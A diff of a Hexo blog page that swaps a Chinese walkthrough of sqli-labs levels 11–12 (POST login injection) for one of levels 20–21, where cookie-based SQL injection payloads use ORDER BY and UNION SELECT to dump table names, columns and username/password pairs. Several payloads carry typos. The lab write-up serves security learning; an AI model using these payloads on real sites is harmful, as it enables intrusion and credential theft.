@@ -5,19 +5,22 @@
   
 
   
-  <title>page十一关手动注入 十二也可以 | Hexo</title>
+  <title>sqlilabs 20 21 手动注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="先判断注入类型  用火狐下载个插件hackbar  然后 post data那边输入 uname&#x3D;admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit （十二关是双引号 就加上“）） 这关的就有提示单引号注入 那么uname&#x3D;admin’ #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 输入这段 登陆">
+  <meta name="description" content="首先20关过滤了post注入 就只好从cookie入手(用火狐的插件hackbar) 先登陆一下获取cookie信息  稍微知道一下cookie的格式 然后判断为字符型注入 uname&#x3D;aaa’ ordey by 4# 获取位数 数字一个个试   到出现这种情况 然后union语句了 uname &#x3D;aaa’ union select 1,2,3 # uname&#x3D;aaa’ union select">
 <meta property="og:type" content="article">
-<meta property="og:title" content="page十一关手动注入 十二也可以">
-<meta property="og:url" content="http://example.com/2021/01/24/page-11/index.html">
+<meta property="og:title" content="sqlilabs 20 21 手动注入">
+<meta property="og:url" content="http://example.com/2021/01/31/page-15/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="先判断注入类型  用火狐下载个插件hackbar  然后 post data那边输入 uname&#x3D;admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit （十二关是双引号 就加上“）） 这关的就有提示单引号注入 那么uname&#x3D;admin’ #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 输入这段 登陆">
+<meta property="og:description" content="首先20关过滤了post注入 就只好从cookie入手(用火狐的插件hackbar) 先登陆一下获取cookie信息  稍微知道一下cookie的格式 然后判断为字符型注入 uname&#x3D;aaa’ ordey by 4# 获取位数 数字一个个试   到出现这种情况 然后union语句了 uname &#x3D;aaa’ union select 1,2,3 # uname&#x3D;aaa’ union select">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-01-24T09:35:33.000Z">
-<meta property="article:modified_time" content="2021-01-24T09:36:29.241Z">
+<meta property="og:image" content="c:/Users/aaa/AppData/Roaming/Typora/typora-user-images/image-20210131141955567.png">
+<meta property="og:image" content="c:/Users/aaa/AppData/Roaming/Typora/typora-user-images/image-20210131142538658.png">
+<meta property="article:published_time" content="2021-01-31T06:43:11.000Z">
+<meta property="article:modified_time" content="2021-01-31T06:44:24.195Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/aaa/AppData/Roaming/Typora/typora-user-images/image-20210131141955567.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -66,10 +69,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-page-11" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-page-15" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2021/01/24/page-11/" class="article-date">
-  <time datetime="2021-01-24T09:35:33.000Z" itemprop="datePublished">2021-01-24</time>
+    <a href="/2021/01/31/page-15/" class="article-date">
+  <time datetime="2021-01-31T06:43:11.000Z" itemprop="datePublished">2021-01-31</time>
 </a>
     
   </div>
@@ -80,7 +83,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      page十一关手动注入 十二也可以
+      sqlilabs 20 21 手动注入
     </h1>
   
 
@@ -88,20 +91,25 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>先判断注入类型 </p>
-<p>用火狐下载个插件hackbar </p>
-<p>然后 post data那边输入 uname=admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd=admin&amp;submit=Submit （十二关是双引号 就加上“））</p>
-<p>这关的就有提示单引号注入 那么uname=admin’ #&amp;passwd=admin&amp;submit=Submit 输入这段</p>
-<p>登陆成功  然后uname=admin’  order by 2（这个数字可以慢慢试看到多少的时候显示登陆错误）#&amp;passwd=admin&amp;submit=Submit 这个是用来的出显示位数的</p>
-<p>接下来使用联合查询语句 union select 来进行爆破，使用union select的时候要注意，输入的unname必须是一个不存在的，，否则将会输出不出来</p>
-<p>uname=aaa’ union select 1,2#&amp;passwd=admin&amp;submit=Submit 比如这样子</p>
-<p>uname=aaa’ union select user(),version() #&amp;passwd=admin&amp;submit=Submit这句爆出使用者和数据库版本</p>
-<p>之后操作就和第一关是一样的都是那些语句</p>
+        <p>首先20关过滤了post注入 就只好从cookie入手(用火狐的插件hackbar)</p>
+<p>先登陆一下获取cookie信息 <img src="C:\Users\aaa\AppData\Roaming\Typora\typora-user-images\image-20210131141955567.png" alt="image-20210131141955567"></p>
+<p>稍微知道一下cookie的格式 然后判断为字符型注入</p>
+<p>uname=aaa’ ordey by 4# 获取位数 数字一个个试 </p>
+<p><img src="C:\Users\aaa\AppData\Roaming\Typora\typora-user-images\image-20210131142538658.png" alt="image-20210131142538658"></p>
+<p>到出现这种情况</p>
+<p>然后union语句了</p>
+<p>uname =aaa’ union select 1,2,3 #</p>
+<p>uname=aaa’ union select 1,2,database() # (获取当前使用的数据库名字) 执行后是security</p>
+<p>uname=aaa’ union select 1,2,group_concat(table_name) from informatin_schema.tables where table_schema=‘security’ # (获得所有表名)</p>
+<p>uname=aaa’ union select 1,2,group_concat(columns_name) from information_schema.columns where table_schema=’security’ and table name=’users’ # 获得字段 </p>
+<p>uname=aaa’ union select 1,2,group_concat(username,0x7e,password)from security,users # 获得字段的数据 </p>
+<p>或者用这个语句uname=aaa’ union select 1,2,group_concat(concat_ws(‘-‘,id,username,password)) from users # </p>
+<p>21关稍微变一下用base64 编码一下uname= 之后的内容即可和20一样的</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/24/page-11/" data-id="ckkay6gmn0000p0v78d5dgon8" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/31/page-15/" data-id="ckkks4e3z0000scv7eth5fpal" class="article-share-link">Share</a>
       
       
     </footer>
@@ -110,19 +118,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/01/24/page-12/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          sqlmap注入前十关
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/01/22/page-9/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/01/24/page-12/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">sqlmap抓包功能</div>
+      <div class="article-nav-title">sqlmap注入前十关</div>
     </a>
   
 </nav>
